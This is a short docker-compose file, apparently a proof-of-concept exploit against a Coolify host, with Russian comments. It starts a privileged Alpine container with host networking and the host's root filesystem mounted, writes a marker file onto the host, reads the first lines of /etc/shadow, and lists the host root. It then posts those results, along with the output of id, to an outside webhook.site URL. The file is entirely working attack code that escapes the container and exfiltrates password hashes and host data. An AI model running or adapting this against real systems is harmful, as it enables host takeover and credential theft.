version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root:rshared'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Доказательство root
        id > /tmp/id.txt
        curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919L?stage=root_proof
        
        # 2. Создаём proof-файл на хосте
        echo "RCE_PROOF_$(date +%s)" > /host-root/tmp/coolify_rce_proof.txt
        echo "Container can write to host filesystem" >> /host-root/tmp/coolify_rce_proof.txt
        echo "Mount test: $(ls /host-root/ | head -10)" >> /host-root/tmp/coolify_rce_proof.txt
        
        # 3. Пытаемся прочитать /etc/shadow (доказательство доступа к чувствительным данным)
        cat /host-root/etc/shadow | head -5 > /tmp/shadow_test.txt 2>&1
        curl -X POST --data-binary @/tmp/shadow_test.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=shadow_read
        
        # 4. Отправляем список того, что видим в /host-root
        ls -la /host-root/ | head -30 > /tmp/host_root_ls.txt
        curl -X POST --data-binary @/tmp/host_root_ls.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=host_root_listing
        
        sleep 3600
